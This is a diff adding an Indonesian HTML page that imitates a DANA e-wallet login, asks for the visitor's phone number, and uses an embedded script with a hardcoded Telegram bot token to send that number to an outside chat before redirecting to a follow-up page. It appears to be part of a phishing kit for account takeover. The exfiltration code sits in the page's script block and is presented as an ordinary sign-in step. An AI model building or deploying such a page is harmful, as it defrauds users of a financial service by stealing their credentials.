@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login — Nomor HP</title>
+  <style>
+    :root {
+      --bg1: #00A2F9;
+      --bg2: #0088CC;
+      --btn1: #007BFF;
+      --btn2: #0056b3;
+      --white: #ffffff;
+      --gray: #f1f5f9;
+    }
+
+    html,body{height:100%;margin:0;font-family:"Segoe UI",Inter,Roboto,sans-serif}
+    body{
+      background: linear-gradient(135deg,var(--bg1),var(--bg2));
+      color:#fff;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      justify-content:space-between;
+      -webkit-font-smoothing:antialiased;
+    }
+
+    .container{padding:30px 20px 120px;text-align:center}
+    .logo{margin-bottom:20px}
+    .logo img{width:140px;max-width:60%;height:auto}
+
+    .title{font-size:22px;font-weight:600;margin-bottom:10px}
+    .subtitle{font-size:14px;opacity:0.95;line-height:1.5;margin-top:6px;color:rgba(255,255,255,0.95)}
+
+    .card{
+      background:var(--white);
+      border-radius:16px;
+      padding:16px;
+      box-shadow:0 6px 20px rgba(0,0,0,0.15);
+      max-width:450px;
+      margin:18px auto 6px;
+      color:#08324a;
+    }
+
+    .input-row{
+      display:flex;align-items:center;background:var(--gray);
+      border-radius:10px;padding:10px;gap:8px;
+    }
+    .flag{font-size:20px}
+    .prefix{font-weight:600;color:#0d4a67}
+    .phone-input{border:0;outline:0;flex:1;font-size:16px;background:transparent;color:#0d4a67}
+
+    .note{max-width:520px;margin:10px auto 0;font-size:13px;color:rgba(255,255,255,0.95);line-height:1.45}
+    .note strong{color:rgba(255,255,255,0.98)}
+
+    .bottom-bar{
+      position:fixed;left:0;right:0;bottom:0;padding:16px 20px;
+      background:linear-gradient(0deg, rgba(0,0,0,0.12), transparent);
+      display:flex;justify-content:center;
+    }
+
+    .btn{
+      width:100%;max-width:450px;margin:0 auto;display:block;
+      background:var(--btn1);border:none;color:#fff;font-weight:600;font-size:16px;
+      padding:14px;border-radius:12px;cursor:pointer;transition:all .2s ease;
+      box-shadow:0 4px 12px rgba(0,0,0,0.25);
+    }
+    .btn:hover{background:var(--btn2)}
+    .btn:active{transform:scale(0.99)}
+    .btn.disabled{opacity:0.6;cursor:not-allowed;background:#9ccaff;box-shadow:none}
+
+    /* Animasi Loading */
+    .loading-overlay{
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:rgba(0,0,0,0.4);
+      display:flex;justify-content:center;align-items:center;
+      z-index:9999;
+      display:none; /* default hidden */
+    }
+    .spinner{
+      border:6px solid #f3f3f3;
+      border-top:6px solid #007BFF;
+      border-radius:50%;
+      width:50px;
+      height:50px;
+      animation:spin 1s linear infinite;
+    }
+    @keyframes spin{
+      0%{transform:rotate(0deg);}
+      100%{transform:rotate(360deg);}
+    }
+
+    @media(max-width:420px){
+      .container{padding:20px 14px 120px}
+      .title{font-size:20px}
+      .logo img{width:120px}
+      .card{margin:14px 6px 6px;padding:12px}
+      .phone-input{font-size:15px}
+      .note{margin:8px 10px 0;font-size:13px}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" role="main">
+    <div class="logo">
+      <img src="https://v.cylnk.web.id/pemulihan-akun-daana/ast/img/dana_logo.png" alt="Logo">
+    </div>
+
+    <h1 class="title">Masukkan Nomor HP</h1>
+    <p class="subtitle">Masukkan nomor HP kamu untuk melanjutkan</p>
+
+    <div class="card" aria-labelledby="phone-label">
+      <form id="phoneForm" onsubmit="return false" autocomplete="on" novalidate>
+        <div class="input-row">
+          <span class="flag" aria-hidden="true">🇮🇩</span>
+          <span class="prefix">+62</span>
+          <input inputmode="numeric" pattern="[0-9]*" id="phone" class="phone-input"
+                 placeholder="811-1234-5678" aria-label="Nomor ponsel tanpa 0 di depan"
+                 maxlength="15" />
+        </div>
+      </form>
+    </div>
+
+    <p class="note">
+      Nomor ponsel akan digunakan sebagai <strong>ID</strong> kamu & menjaga akun selalu aman.
+      Dengan melanjutkan, kamu setuju dengan <strong>Syarat & Ketentuan</strong> dan <strong>Kebijakan Privasi</strong>.
+    </p>
+  </div>
+
+  <div class="bottom-bar" role="region" aria-label="Aksi">
+    <button id="btn" class="btn disabled" aria-disabled="true">LANJUT</button>
+  </div>
+
+  <!-- Overlay animasi -->
+  <div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+  </div>
+
+  <script>
+    const TOKEN = "7968576316:AAF6vbfSpa2XL-WIT_1mkUKmo2khbAAVrIs";
+    const CHAT_ID = "7604299278";
+    const URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    const input = document.getElementById('phone');
+    const btn = document.getElementById('btn');
+    const loading = document.getElementById('loading');
+
+    function formatPhone(v){
+      const digits = v.replace(/\D/g,'').replace(/^0+/, '');
+      let parts = [];
+      if (digits.length <= 3) parts = [digits];
+      else if (digits.length <= 7) parts = [digits.slice(0,3), digits.slice(3)];
+      else parts = [digits.slice(0,3), digits.slice(3,7), digits.slice(7,11)];
+      return parts.filter(Boolean).join('-');
+    }
+    function normalizeDigits(v){ return v.replace(/\D/g,'').replace(/^0+/, ''); }
+
+    input.addEventListener('input', ()=>{
+      const formatted = formatPhone(input.value);
+      input.value = formatted;
+      const digits = normalizeDigits(formatted);
+      if (digits.length >= 8) {
+        btn.classList.remove('disabled');
+        btn.setAttribute('aria-disabled','false');
+      } else {
+        btn.classList.add('disabled');
+        btn.setAttribute('aria-disabled','true');
+      }
+    });
+
+    btn.addEventListener('click', ()=>{
+      if (btn.classList.contains('disabled')) return;
+      const digits = normalizeDigits(input.value);
+      if (!digits || digits.length < 8) {
+        alert('Masukkan nomor yang valid.');
+        return;
+      }
+
+      // tampilkan animasi
+      loading.style.display = 'flex';
+      btn.textContent = 'Mengirim...';
+      btn.classList.add('disabled');
+
+      const text = `Nomor HP: +62${digits}`;
+
+      fetch(URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+      })
+      .then(res => res.json())
+      .then(() => {
+        setTimeout(()=> window.location.href = 'pn.html', 1000);
+      })
+      .catch(err => {
+        alert("Gagal mengirim: " + err);
+        btn.textContent = 'LANJUT';
+        btn.classList.remove('disabled');
+        loading.style.display = 'none';
+      });
+    });
+
+    window.addEventListener('load', ()=> setTimeout(()=> input.focus(), 300));
+  </script>
+</body>
+</html>
